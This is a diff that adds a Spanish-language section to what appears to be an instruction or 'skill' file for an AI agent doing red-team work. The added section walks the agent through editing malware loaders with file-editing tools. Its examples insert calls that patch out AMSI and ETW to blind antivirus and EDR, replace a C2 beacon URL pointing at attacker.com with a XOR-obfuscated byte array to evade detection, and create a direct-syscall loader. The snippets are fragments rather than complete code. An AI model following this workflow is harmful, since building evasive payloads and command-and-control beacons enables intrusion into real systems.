@@ -125,6 +125,63 @@ En `notes.md` (vía TARGET_UPDATE):
   fragmentada anterior, mover a obfuscación más agresiva.
 ```
 
+## Edición de código (workflow recomendado)
+
+Para iterar sobre payloads y loaders (C, C++, C#, Nim, Rust, Go, PowerShell)
+usa **FILE_READ → FILE_EDIT** en lugar de comandos shell tipo `sed -i`. El
+operador ve un diff coloreado antes de aplicar el cambio y se valida la
+unicidad del texto a sustituir, así no corrompes el archivo si te equivocas
+de match.
+
+### Patrón típico — añadir AMSI bypass a un loader C
+
+```
+[[FILE_READ: payloads/loader.c]]
+```
+
+(El próximo turno recibes el contenido numerado del archivo.)
+
+```
+[[FILE_EDIT: payloads/loader.c]]
+<<<OLD
+int main(int argc, char** argv) {
+    init_runtime();
+OLD>>>
+<<<NEW
+int main(int argc, char** argv) {
+    init_runtime();
+    patch_amsi();   // disable AMSI antes de cualquier IEX/script
+    patch_etw();    // silenciar telemetría a EDR
+NEW>>>
+[[/FILE_EDIT]]
+```
+
+### Patrón típico — sustituir string detectable por XOR encoded
+
+```
+[[FILE_EDIT: payloads/c2_beacon.c]]
+<<<OLD
+const char* C2_URL = "https://attacker.com/beacon";
+OLD>>>
+<<<NEW
+// XOR-encoded con key 0x42; decode_string() lo resuelve runtime
+const char C2_URL_OBF[] = {0x3a,0x3a,0x36,0x30,0x3a,...};
+NEW>>>
+[[/FILE_EDIT]]
+```
+
+### Patrón típico — generar loader nuevo desde cero
+
+Cuando vas a crear un loader nuevo (no modificar uno existente), usa
+`FILE_WRITE`:
+
+```
+[[FILE_WRITE: payloads/syswhispers_loader.c]]
+#include <windows.h>
+// ... loader completo con direct syscalls ...
+[[/FILE_WRITE]]
+```
+
 ## Skills relacionadas
 
 - `red_team_ops` — esta skill es esencial dentro de red team auténtico.
